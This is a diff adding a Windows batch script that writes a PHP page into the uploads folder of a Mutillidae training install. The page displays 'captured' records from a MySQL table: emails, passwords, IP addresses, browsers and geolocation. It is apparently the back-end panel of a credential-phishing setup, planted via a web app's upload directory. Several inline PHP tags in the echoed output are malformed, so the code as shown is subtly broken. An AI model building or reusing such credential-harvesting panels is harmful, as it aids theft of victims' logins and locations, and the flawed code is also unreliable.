@@ -1,0 +1,81 @@
+echo ^<?php > C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo // Conexión a la base de datos >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo $conexion = new mysqli("localhost", "root", "", "datos"); >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo if ($conexion->connect_error) { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     die("Conexión fallida: " . $conexion->connect_error); >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo $resultado = $conexion->query("SELECT * FROM capturas ORDER BY id DESC"); >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ?^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^<!DOCTYPE html^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^<html^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^<head^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^<meta charset="UTF-8"^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^<title^>Datos capturados^</title^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^<style^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         table { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             width: 100%%; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             border-collapse: collapse; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             margin-top: 20px; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         th, td { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             padding: 10px; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             border: 1px solid #888; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             text-align: left; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         th { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             background-color: #333; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             color: white; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         tr:nth-child(even) { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             background-color: #f2f2f2; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         body { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             font-family: Arial, sans-serif; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             padding: 40px; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         h2 { >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             color: #333; >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^</style^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^</head^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^<body^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^<h2^>Registros capturados^</h2^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^<table^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         ^<thead^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             ^<tr^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>ID^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Correo^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Contraseña^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>IP^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Sistema Operativo^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Navegador^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Fecha^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Latitud^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<th^>Longitud^</th^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             ^</tr^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         ^</thead^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         ^<tbody^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         ^<?php while ($fila = $resultado->fetch_assoc()): ?^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             ^<tr^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['id']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['correo']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['contrasena']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['ip']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['so']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['navegador']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['fecha']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['latitud']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo                 ^<td^>^<?= htmlspecialchars($fila['longitud']) ^>^</td^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo             ^</tr^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         ^<?php endwhile; ?^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo         ^</tbody^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo     ^</table^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^</body^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^</html^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ^<?php >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo $conexion->close(); >> C:\xampp\htdocs\mutillidae\uploads\datos.php
+echo ?^> >> C:\xampp\htdocs\mutillidae\uploads\datos.php
